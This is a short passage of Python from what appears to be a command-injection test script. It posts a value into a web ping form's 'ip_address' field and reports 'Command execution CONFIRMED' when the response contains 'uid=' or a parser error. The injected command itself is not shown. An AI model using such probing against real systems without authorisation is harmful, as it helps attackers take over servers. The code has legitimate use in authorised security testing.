response = requests.post(ping_endpoint, data={"ip_address": test_cmd}, timeout=10)
if "uid=" in response.text.lower() or "command substitution" in response.text.lower():
    match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if match:
        print(f"    Output: {match.group(1)}")
        print("    STATUS: Command execution CONFIRMED")
elif "Failed to parse" in response.text:
    # The error appearing means command executed but output didn't match regex
    print("    Parser error = command executed but output didn't match regex")
    print("    STATUS: Command execution CONFIRMED")

# 2. Test the fake ping output
